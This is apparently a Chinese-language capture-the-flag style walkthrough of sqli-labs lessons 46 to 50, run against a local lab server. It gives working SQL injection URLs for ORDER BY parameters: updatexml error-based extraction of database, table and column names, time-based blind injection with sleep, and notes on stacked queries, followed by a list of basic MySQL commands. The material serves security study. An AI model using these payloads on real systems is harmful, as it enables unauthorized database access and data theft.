46

然后注意到有报错信息，用报错注入。

分析源码后

这三关是排序注入order by，不同于where后面的注入，它不可以使用union联合查询注入

http://192.168.127.1/sqli-labs-master/Less-46/?sort=1 desc（降序）/asc(升序)

爆库

http://192.168.127.1/sqli-labs-master/Less-46/?sort=1%20and%20updatexml(1,concat(0x7e,(database()),0x7e),1)

爆表

http://192.168.127.1/sqli-labs-master/Less-46/?sort=1%20and%20updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 1,1),0x7e),1)

爆列

http://192.168.127.1/sqli-labs-master/Less-46/?sort=1%20and%20updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema=database() and table_name=’users’ limit 1,1),0x7e),1)

47

注入点判断不同是单引号注入。

爆库

http://192.168.127.1/sqli-labs-master/Less-47/?sort=1%27 and updatexml(1,concat(0x7e,(database()),0x7e),1)–+

48

注入点判断是整型。和前面一样都是属于order by 语句。

源码显现无法显现报错，所以我们要换方法。sort=rand(true/false)进行判断，也可以用延时注入。

rand(true) == rand(1)

因此通过rand(判断语句)的回显情况与rand(1)进行对比，确定其正确性。

延时注入

http://192.168.127.1/sqli-labs-master/Less-48/?sort=1 and (if(ascii(substr(database(),1))=115,0,sleep(5)))

这里就可用到前边的Lesson8时学的脚本跑一下会比较快。

这题也可用一句话木马在第七关我们做过啦。

49

这一关和四十八关类似，犯了一个十分愚蠢的错误，一直在做题的时候会忘记加–+

无语’

然后我发现hackbar有时候会掉线啊，不行啊。。。

延时

http://192.168.127.1/sqli-labs-master/Less-49/?sort=1' and (if(ascii(substr(database(),1))=115,1,sleep(5)))–+

这里随机排序注入判断rand()姿势没办法用了。

第五十关–第五十三关

50

又是我们熟悉的堆叠注入，这里复习一下。具体解题步骤见Lesson29-39好了。

当然可以用报错注入

这里我们先来补充一些常用操作。

1.这里执行sql语句的函数是mysqli_multi_query()，它与以往执行sql语句的函数mysqli_query()不同，它一次可执行多条语句

2.

（1）数据库

查看所有数据库

SHOW DATABASES;
#创建一个数据库
CREATE DATABASE n;
#删除一个数据库
DROP DATABASE n;
#使用这个数据库
USE n;

（2）表

查看所有表

SHOW TABLES FROM database;
#创建一个表
CREATE TABLE n(id int,name varchar(10));
CREATE TABLE n(id int,name varchar(10),PRIMARY KEY (id),FOREIGN KEY(id))

直接将查询结果导入或复制到新创建的表

CREATE TABLE n SELECT * FROM m;
#新创建的表于一个存在的表的数据结构类似
CREATE TABLE n LIKE m;
#创建临时表
#临时表将在你连接Mysql期间存在。但断开连接时，Mysql将自动删除表并释放所用空间，也可以手动删除
CREATE TEMPORARY TABLE n(id int,name varchar(10));

直接将查询结果导入新创建的临时表

CREATE TEMPORARY TABLE n SELECT * FROM m;
#删除一个存在表
DROP TABLE IF EXISTS n;
#更改存在表的名称
ALTER TABLE n RENAME m;
RENAME TABLE n TO m;
#查看表的结构
DESC n;
SHOW COLUMNS IN n;
SHOW COLUMNS FROM n;
#查看表的创建语句
SHOW CREATE TABLE n;

（3）表的结构

添加字段

ALTER TABLE n ADD age varchar(2);
#删除字段
ALTER TABLE n DROP age;
#更改字段名和熟悉
ALTER TABLE n CHANGE age a int;
#只更改字段属性
ALTER TABLE n MODIRY age varchar(7);

（4）表的数据

增加数据

INSERT INTO n VALUES(1,’TOM’,’23’);
INSERT INTO n SELECT * FROM n;#把数据复制一遍再插入

删除数据

DELETE FROM n WHERE id=2;
#更新数据
UPDATE n SET name=’tom’ WHERE id=2;
#数据查找
SELECT * FROM n WHERE name LIKE ‘%H’;
#数据排序（倒序）
SELECT * FROM n ORDER BY name,id DESC;

因为是整形注入所以不加%23是可以的，但是为了以防自己下次忘记了，所以这里以后都加进去好了。
